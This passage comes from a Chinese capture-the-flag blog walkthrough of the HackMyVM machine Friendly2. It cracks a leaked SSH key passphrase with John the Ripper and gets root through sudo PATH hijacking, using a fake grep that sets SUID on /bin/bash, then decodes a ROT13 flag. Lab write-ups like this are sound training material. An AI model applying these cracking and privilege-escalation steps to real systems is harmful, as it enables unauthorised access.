+RwDz5GzPiB9aiSw8gDSkgPUmbWztiSWiXlCv25p0yblMYtIYcTBLWkpK8DRkR0iShxjfLC
+TDR1WHXRNjmli/ZlsH0Unfs0Vk/dNpYfJoePkvKYpLEi3UFfucsQH1KyqLKQbbka82i+v/
+pD1DmNcHFVagbI9hQkYGOHON66UX0l/LIw0inIW7CRc8z0lpkShXFBgLPeg+mvzBGOEyq6
+<span class="token assign-left variable">9tDhjVw3oagRmc3R03zfIwbPINo</span><span class="token operator">=</span>
+-----END OPENSSH PRIVATE KEY-----
+                                                                                                                                                                                                                                         
+┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># chmod 600 aaa</span>
+                                                                                                                                                                                                                                         
+┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># ssh -i aaa gh0st@192.168.56.178</span>
+Enter passphrase <span class="token keyword">for</span> key <span class="token string">'aaa'</span><span class="token builtin class-name">:</span> </code></pre>
+<p>不过还需要密码，join爆破一下</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># ssh2john aaa > bbb</span>
+                                                                                                                                                                                                                                         
+┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># cat bbb                                  </span>
+aaa:<span class="token variable">$sshng</span><span class="token variable">$6</span><span class="token variable">$16</span><span class="token variable">$bba5ea10138ccd630bebbfbd874ece13</span><span class="token variable">$1910</span><span class="token variable">$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010bba5ea10138ccd630bebbfbd874ece13000000100000000100000197000000077373682d727361000000030100010000018100b68b5cb38b71b940f4a54e073f11d9efae2b089b46748eae070d024344c6974388b851d2256c48263bf140d7b907cd8d4cce2e6f24570b512555705d48027cb90e1f15038b7ff8b447d04171e991626d88a750969c82d783d11c51014a8d3a38986b2cc6d6159d2ac7df1b32b3f048d0f717015c047d3c1b3a5a486eafe529b478b4f109ad0962d5f17028d035bd0139648528f6e4a8a270d9be9e66c46cb68ad54ed4fc26970c764271d21d919d489cb8f6e3ab28be7e6414f6810476e67b3f638b5d5835a1d51e01246f7edb2c99bde65ddf914eac4469f3e8996a5d89d12cdf3828016cb1039d14214aa801d43c2e1e8368bde4a54c116db55b709e9fc5050e119ef2c97ef95214cbf9ea667f1ebfc75e7849374570d16fa9f00771bef7a04181529dec708179d8aacd7139999eb87fcc1b8a6cb60e633cadf04c19006a8e8727c64212ee6b044557abcf85df5d44590cb6e0060c25716a3e7fccf645605ac1581d6a39b77cbf11813ec0b7f294b83edb9500ceb2459947c2ac7a072251af00000590348f66c2c20fbbf3a01056962e443ecf4a00dba7fc93fd215d958f37d4c7ad515947018eb43f2ebad520a4ff52c87acbd368c2c7f4c6772a6284f754788e5f7c2bd723df1c9ef403ccaf790d28813649881eedd5f3e7f47bf43248d154de9548dc98c1e82812297d9276237e7a951db59c1bca7ac97848799a1d142ea41e63559e7337cb28d4457a613a34f15cf9ba3b76e429b7523c0c73e4875514da891f87c52838c6e47ce48bad5bc1d1d01a8a4935466b50b37c79087e8d863b073a2ef10ddcdad8075624f67859bbdc684222fef94372378e2f6f394c80ea6a89b5f4ee174ab0d90fbd16eb58ccdf086c89c2c3aeea56c415204cfaaf15baf70f73ab4147cb300d5cfc56dbd6fa9340571bb1b0293032a6d99e0b8a065a77b74e6323d54e81258b2ce4b0893b7f4c7766bb3ea35ab6169138891de142d447d8819e1a8dc866d195e839d68307bf1534164f9ed334f32850d92b5b9966a3af59da38c10596b8abf78ef38f13d8594612dedf595b2ecef792b259f957e993e90608a5682325cbe437343496c05412cd1bceb84fd4270f67f75ecf0a01185bdbe5c9eb87445f8c26bd3d8a0d47e77f22e3bd37e4801e167b93e76fe077b67402774b12b857d908800b112cc18b64eaf5fad170a616769ab7bf67f4a84f8486365f2398e5dbe829dc44ba222e06157066c4309cdd118f328413f2bd7d7e1425472078c60945429d8a9902ac645e1374628734394fa353abcda76dfd1dbb5a28edae11a2631380836d06dff1cc6cb5de10cb9fcc05aaab4ea9fa5165a233ef3dabd3bcd2990e61da1e1dc58bc743911c53f1075bdbfd051549e5a7407f4e09f13940be752da85ea0c3bd9fc4397726d226747c6e39e7662c90d0056d15a0a71dee7a0b863cb0014eb72322f68d862b169739b52c66ddf47b87adaf5160d89358ebe31a6d2f0aea851c22ecbea4e6c5ce58235c831d886922c7fbb04feb42dbe1c7c807adb766db830b93ac1ddc03c6e4b8da47fec05f81f7f9ac5183bba469144572885d11ea89fa7594414c25c8ca67dda63eb0068d3fba3d18a6acaa153709a676f67e7b4f715a0848ceece6419553fd7d7cddfdaed00851af575a4e4fc88d9abce60c9f2789c27def690d1d6db9daa9c90b6332ccf2fca8ca0285c564b7042eb0d130590ea433dfab03d2dd1b7c8792b996a6b6d4853f5fe9b9f2d8b45fb368850eb0acf0c2962052cafa8a24452954d3bfbc3672a3365426af4e81a423ceb10fd6ca2d4fb1367b9235babe9ad3995287402ae38df12756d3404539247ff0437b7594ca1a2a6eadaa3c96cad3d175bec9987e9a5495b6e20b7cee5f7462b0ca006b8fa6a6d4942338712798a91c2258cc270554644fece33bacb87d3d2b1db1314c7858c90b494c9d4af7e501503b647f6ef2186fae004bfc68798662d9eee72474ad2c997b5db56b7eb1f06871540a6e4794b3e6e78e45a78aa67e64b54a76368037c6c865536a5215fac6709aba85570e478a976b4fed0ba1a836ce2ddee1a0eba12c3e2cf4b56ac6f16d0ee4568edc0585cdb91fc1ec42d8ca0914fb3b2cdda1cf7c1416db24259dcaefa069bab5effb3147a59f86ef908f79d8d8919adb7d1f32506f49f8e2ca0bd74d302bf7c66aca2a0452c46f59eecc66cb2a6434568fc73ad4b5ac19f0f0273fea3a85891d74ea49c095f7e07e5497e8546299fdb39327535b32593af9f094d66e1f03febb34cd98edca97bfc1d7767956ad9cd3c166ea7b04700f3e46ccf881f5a892c3c8034a480f5266d6ced8925a25e50afdb9a74c9b94c62d21871304b5a4a4af034644748928718df2c24c34755875d13639a58bf665b07d149dfb34564fdd36961f26878f92f298a4b122dd415fb9cb101f52b2a8b2906db91af368bebffa43d4398d7071556a06c8f6142460638738deba517d25fcb230d229c85bb09173ccf496991285714180b3de83e9afcc118e132abaf6d0e18d5c37a1a81199cdd1d37cdf2306cf20da</span><span class="token variable">$16</span><span class="token variable">$486</span>
+                                                                                                                                                                                                                                         
+┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># john bbb   </span>
+Using default input encoding: UTF-8
+Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>SSH, SSH private key <span class="token punctuation">[</span>RSA/DSA/EC/OPENSSH <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
+Cost <span class="token number">1</span> <span class="token punctuation">(</span>KDF/cipher <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">=</span>MD5/AES <span class="token assign-left variable">1</span><span class="token operator">=</span>MD5/3DES <span class="token assign-left variable">2</span><span class="token operator">=</span>Bcrypt/AES<span class="token punctuation">]</span><span class="token punctuation">)</span> is <span class="token number">2</span> <span class="token keyword">for</span> all loaded hashes
+Cost <span class="token number">2</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">16</span> <span class="token keyword">for</span> all loaded hashes
+Proceeding with single, rules:Single
+Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
+Warning: Only <span class="token number">1</span> candidate buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
+0g <span class="token number">0</span>:00:00:22 <span class="token number">17.27</span>% <span class="token number">1</span>/3 <span class="token punctuation">(</span>ETA: <span class="token number">18</span>:57:30<span class="token punctuation">)</span> 0g/s <span class="token number">3</span>.658p/s <span class="token number">3</span>.658c/s <span class="token number">3</span>.658C/s Aaa7
+Session aborted
+                                                                                                                                                                                                                                         
+┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># john bbb --wordlist=/usr/share/wordlists/rockyou.txt </span>
+Using default input encoding: UTF-8
+Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>SSH, SSH private key <span class="token punctuation">[</span>RSA/DSA/EC/OPENSSH <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
+Cost <span class="token number">1</span> <span class="token punctuation">(</span>KDF/cipher <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">=</span>MD5/AES <span class="token assign-left variable">1</span><span class="token operator">=</span>MD5/3DES <span class="token assign-left variable">2</span><span class="token operator">=</span>Bcrypt/AES<span class="token punctuation">]</span><span class="token punctuation">)</span> is <span class="token number">2</span> <span class="token keyword">for</span> all loaded hashes
+Cost <span class="token number">2</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">16</span> <span class="token keyword">for</span> all loaded hashes
+Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
+celtic           <span class="token punctuation">(</span>aaa<span class="token punctuation">)</span>     
+1g <span class="token number">0</span>:00:00:24 DONE <span class="token punctuation">(</span><span class="token number">2024</span>-05-27 <span class="token number">18</span>:56<span class="token punctuation">)</span> <span class="token number">0</span>.04144g/s <span class="token number">10</span>.36p/s <span class="token number">10</span>.36c/s <span class="token number">10</span>.36C/s celtic
+Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
+Session completed. </code></pre>
+<p>密码是<code>celtic</code></p>
+<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># ssh -i aaa gh0st@192.168.56.178</span>
+Enter passphrase <span class="token keyword">for</span> key <span class="token string">'aaa'</span><span class="token builtin class-name">:</span> 
+Linux friendly2 <span class="token number">5.10</span>.0-21-amd64 <span class="token comment">#1 SMP Debian 5.10.162-1 (2023-01-21) x86_64</span>
+
+The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
+the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
+individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+gh0st@friendly2:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>gh0st<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>gh0st<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>gh0st<span class="token punctuation">)</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">gh0st@friendly2:~$ <span class="token function">cat</span> user*
+ab0366431e2d8ff563cf34272e3d14bd
+gh0st@friendly2:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">32</span>
+drwxr-xr-x <span class="token number">4</span> gh0st gh0st <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">3</span> root  root  <span class="token number">4096</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
+lrwxrwxrwx <span class="token number">1</span> root  root     <span class="token number">9</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
+-rw-r--r-- <span class="token number">1</span> gh0st gh0st  <span class="token number">220</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> gh0st gh0st <span class="token number">3526</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> .bashrc
+drwxr-xr-x <span class="token number">3</span> gh0st gh0st <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> .local
+-rw-r--r-- <span class="token number">1</span> gh0st gh0st  <span class="token number">807</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> .profile
+drwx--x--x <span class="token number">2</span> gh0st gh0st <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> .ssh
+-r--r----- <span class="token number">1</span> gh0st root    <span class="token number">33</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> user.txt</code></pre>
+<p>拿到user flag</p>
+<h1 id="提权user"><a href="#提权user" class="headerlink" title="提权user"></a>提权user</h1><p>sudo看一手</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">gh0st@friendly2:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> gh0st on friendly2:
+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin
+
+User gh0st may run the following commands on friendly2:
+    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> SETENV: NOPASSWD: /opt/security.sh</code></pre>
+<p>稳了</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">gh0st@friendly2:~$ <span class="token function">cat</span> /opt/security.sh
+<span class="token comment">#!/bin/bash</span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"Enter the string to encode:"</span>
+<span class="token builtin class-name">read</span> string
+
+<span class="token comment"># Validate that the string is no longer than 20 characters</span>
+<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$&#123;<span class="token operator">#</span>string&#125;</span> <span class="token parameter variable">-gt</span> <span class="token number">20</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+  <span class="token builtin class-name">echo</span> <span class="token string">"The string cannot be longer than 20 characters."</span>
+  <span class="token builtin class-name">exit</span> <span class="token number">1</span>
+<span class="token keyword">fi</span>
+
+<span class="token comment"># Validate that the string does not contain special characters</span>
+<span class="token keyword">if</span> <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$string</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-q</span> <span class="token string">'[^[:alnum:] ]'</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+  <span class="token builtin class-name">echo</span> <span class="token string">"The string cannot contain special characters."</span>
+  <span class="token builtin class-name">exit</span> <span class="token number">1</span>
+<span class="token keyword">fi</span>
+
+<span class="token assign-left variable">sus1</span><span class="token operator">=</span><span class="token string">'A-Za-z'</span>
+<span class="token assign-left variable">sus2</span><span class="token operator">=</span><span class="token string">'N-ZA-Mn-za-m'</span>
+
+<span class="token assign-left variable">encoded_string</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$string</span>"</span> <span class="token operator">|</span> <span class="token function">tr</span> $sus1 $sus2<span class="token variable">)</span></span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"Original string: <span class="token variable">$string</span>"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"Encoded string: <span class="token variable">$encoded_string</span>"</span></code></pre>
+<p>对输入的字符串进行编码,看一下权限</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">gh0st@friendly2:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /opt/security.sh
+-rwxr-xr-x <span class="token number">1</span> root root <span class="token number">561</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> /opt/security.sh</code></pre>
+<p>不能编辑，只能从脚本本身下手，发现使用了grep，那么可以自己写个grep，让它执行我们的grep</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">gh0st@friendly2:~$ <span class="token function">vi</span> <span class="token function">grep</span>
+gh0st@friendly2:~$ <span class="token function">cat</span> <span class="token function">grep</span>
+<span class="token function">chmod</span> u+s /bin/bash</code></pre>
+<p>添加环境变量</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">gh0st@friendly2:~$ <span class="token function">chmod</span> +x <span class="token function">grep</span>
+gh0st@friendly2:~$ <span class="token function">sudo</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PWD</span><span class="token builtin class-name">:</span><span class="token environment constant">$PATH</span> /opt/security.sh
+Enter the string to encode:
+<span class="token number">123</span>
+The string cannot contain special characters.
+gh0st@friendly2:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">36</span>
+drwxr-xr-x <span class="token number">4</span> gh0st gh0st <span class="token number">4096</span> May <span class="token number">27</span> 07:08 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">3</span> root  root  <span class="token number">4096</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
+lrwxrwxrwx <span class="token number">1</span> root  root     <span class="token number">9</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
+-rw-r--r-- <span class="token number">1</span> gh0st gh0st  <span class="token number">220</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> gh0st gh0st <span class="token number">3526</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> .bashrc
+-rwxr-xr-x <span class="token number">1</span> gh0st gh0st   <span class="token number">20</span> May <span class="token number">27</span> 07:08 <span class="token function">grep</span>
+drwxr-xr-x <span class="token number">3</span> gh0st gh0st <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> .local
+-rw-r--r-- <span class="token number">1</span> gh0st gh0st  <span class="token number">807</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> .profile
+drwx--x--x <span class="token number">2</span> gh0st gh0st <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> .ssh
+-r--r----- <span class="token number">1</span> gh0st root    <span class="token number">33</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> user.txt
+gh0st@friendly2:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /bin/bash
+-rwsr-xr-x <span class="token number">1</span> root root <span class="token number">1234376</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> /bin/bash
+gh0st@friendly2:~$ <span class="token function">bash</span> <span class="token parameter variable">-p</span>
+bash-5.1<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>gh0st<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>gh0st<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>gh0st<span class="token punctuation">)</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">bash-5.1<span class="token comment"># cat /root/r*</span>
+Not yet<span class="token operator">!</span> Try to <span class="token function">find</span> root.txt.
+
+
+Hint: <span class="token punctuation">..</span>.
+bash-5.1<span class="token comment"># find / -name root.txt 2>/dev/null</span>
+/root/root.txt
+bash-5.1<span class="token comment"># cd /root</span>
+bash-5.1<span class="token comment"># ls -al</span>
+total <span class="token number">28</span>
+drwx------  <span class="token number">3</span> root root <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">19</span> root root <span class="token number">4096</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
+lrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">9</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
+-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">571</span> Apr <span class="token number">10</span>  <span class="token number">2021</span> .bashrc
+-r-xr-xr-x  <span class="token number">1</span> root root  <span class="token number">509</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> interfaces.sh
+drwxr-xr-x  <span class="token number">3</span> root root <span class="token number">4096</span> Apr  <span class="token number">8</span>  <span class="token number">2023</span> .local
+-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">161</span> Jul  <span class="token number">9</span>  <span class="token number">2019</span> .profile
+-r--------  <span class="token number">1</span> root root   <span class="token number">43</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> root.txt</code></pre>
+<p>不是，你flag在哪<br>提示是<code>...</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">bash-5.1<span class="token comment"># find / -name ... 2>/dev/null</span>
+/<span class="token punctuation">..</span>.
+bash-5.1<span class="token comment"># cd /...</span>
+bash-5.1<span class="token comment"># ls -al</span>
+total <span class="token number">12</span>
+d-wx------  <span class="token number">2</span> root root <span class="token number">4096</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">19</span> root root <span class="token number">4096</span> Apr <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
+-r--------  <span class="token number">1</span> root root  <span class="token number">100</span> Apr <span class="token number">29</span>  <span class="token number">2023</span> ebbg.txt
+bash-5.1<span class="token comment"># cat eb*</span>
+It's codified, <span class="token function">look</span> the cipher:
+
+98199n723q0s44s6rs39r33685q8pnoq
+
+
+
+Hint: numbers are not codified
+bash-5.1<span class="token comment"># </span></code></pre>
+<p>找到flag了，但被加密了，提示数字没有被编码，那么应该就是那个编码的sh脚本，让ai帮我写个解密脚本</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"Enter the string to decode:"</span>
+<span class="token builtin class-name">read</span> encoded_string
+
+<span class="token assign-left variable">sus1</span><span class="token operator">=</span><span class="token string">'A-Za-z'</span>
+<span class="token assign-left variable">sus2</span><span class="token operator">=</span><span class="token string">'N-ZA-Mn-za-m'</span>
+
+<span class="token assign-left variable">decoded_string</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$encoded_string</span>"</span> <span class="token operator">|</span> <span class="token function">tr</span> $sus2 $sus1<span class="token variable">)</span></span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"Encoded string: <span class="token variable">$encoded_string</span>"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"Decoded string: <span class="token variable">$decoded_string</span>"</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># ./aa.sh</span>
+Enter the string to decode:
+98199n723q0s44s6rs39r33685q8pnoq
+Encoded string: 98199n723q0s44s6rs39r33685q8pnoq
+Decoded string: 98199a723d0f44f6ef39e33685d8cabd</code></pre>
+<p> 提交，正确。</p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/ed97f61a/" title="HackMyVM-Friendly2">https://tao0845.github.io/posts/ed97f61a/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/3e4e3078/" rel="prev" title="LDAP协议"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">LDAP协议</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/201f4a94/" rel="next" title="HackMyVM-Friendly"><span class="post-nav-text">HackMyVM-Friendly</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
